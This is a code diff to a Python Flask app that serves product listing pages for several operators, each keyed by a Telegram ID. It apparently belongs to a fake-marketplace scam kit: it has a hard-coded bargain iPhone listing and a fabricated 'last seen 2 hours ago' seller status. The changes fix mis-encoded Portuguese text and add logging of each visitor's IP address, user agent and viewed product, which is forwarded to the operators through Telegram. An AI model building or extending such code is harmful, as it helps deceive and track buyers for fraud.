@@ -533,9 +533,15 @@ def _session_id(data):
     return data.get('session_id', str(uuid.uuid4()))
 
 def _log(event_type, session_id, data):
-    """Central logging â€” writes to bot.py DB (encrypted) + sends Telegram notification."""
+    """Central logging — writes to bot.py DB (encrypted) + sends Telegram notification."""
     ip = _user_ip()
-    data['ip'] = ip
+    if not isinstance(data, dict):
+        data = {}
+    data['ip'] = data.get('ip') or ip
+    if 'ua' not in data or not data['ua']:
+        data['ua'] = _user_ua()
+    if 'slug' not in data or not data['slug'] or data['slug'] in ('—', 'None', '-', ''):
+        data['slug'] = request.args.get('slug') or request.args.get('p') or 'principal'
     if BOT_AVAILABLE:
         try:
             admin_bot.log_event(event_type, session_id, ip, data)
@@ -683,15 +689,26 @@ def index(slug_or_code=None, item_code=None):
 
         cfgs = tg_wh.get_tenant_all_config(tg_id)
         
-        # Se for um item especÃ­fico do catÃ¡logo prÃ³prio do admin
+        # Se for um item específico do catálogo próprio do admin
         p_name = custom_item["title"] if custom_item else cfgs.get("product_name", "iPhone 11 64GB Branco")
         p_price = custom_item["price"] if custom_item else cfgs.get("product_price", "630.00")
         p_old_price = custom_item["old_price"] if custom_item else cfgs.get("product_old_price", "")
-        p_desc = custom_item["description"] if custom_item else cfgs.get("product_description", "iPhone 11 em Ã³timo estado.")
+        p_desc = custom_item["description"] if custom_item else cfgs.get("product_description", "iPhone 11 em ótimo estado.")
         p_img = (custom_item["image_url"] if custom_item and custom_item["image_url"] else cfgs.get("product_image", "/static/images/iphone11_1.jpg"))
         p_img1 = (custom_item["image1"] if custom_item and custom_item["image1"] else p_img)
         p_img2 = (custom_item["image2"] if custom_item and custom_item["image2"] else cfgs.get("product_image2", ""))
         p_img3 = (custom_item["image3"] if custom_item and custom_item["image3"] else cfgs.get("product_image3", ""))
+
+        tg_wh.record_tenant_session(tg_id, slug, sid, ip, ua[:200])
+        tg_wh.log_tenant_event(tg_id, slug, "PAGE_ENTRY", sid, ip, {"ua": ua[:200], "item": item_code or "default"})
+        _log("PAGE_ENTRY", sid, {
+            "slug": slug,
+            "ip": ip,
+            "ua": ua,
+            "product_name": p_name,
+            "product_price": p_price,
+            "item": item_code or "default"
+        })
 
         # Dados de shipping do produto
         p_shipping_mode   = custom_item.get("shipping_mode",   "full")    if custom_item else "full"
@@ -795,7 +812,13 @@ def index(slug_or_code=None, item_code=None):
     seller_status = admin_bot.get_config("seller_status", "Ãšltimo acesso hÃ¡ 2 horas") if BOT_AVAILABLE else "Ãšltimo acesso hÃ¡ 2 horas"
     logo_url      = admin_bot.get_config("logo_url", "") if BOT_AVAILABLE else ""
 
-    _log("PAGE_ENTRY", sid, {"ua": ua, "path": request.path, "product": product_name})
+    _log("PAGE_ENTRY", sid, {
+        "ua": ua,
+        "path": request.path,
+        "product_name": product_name,
+        "product_price": product_price,
+        "slug": p_code or "principal"
+    })
 
     return render_template(
         'index.html',
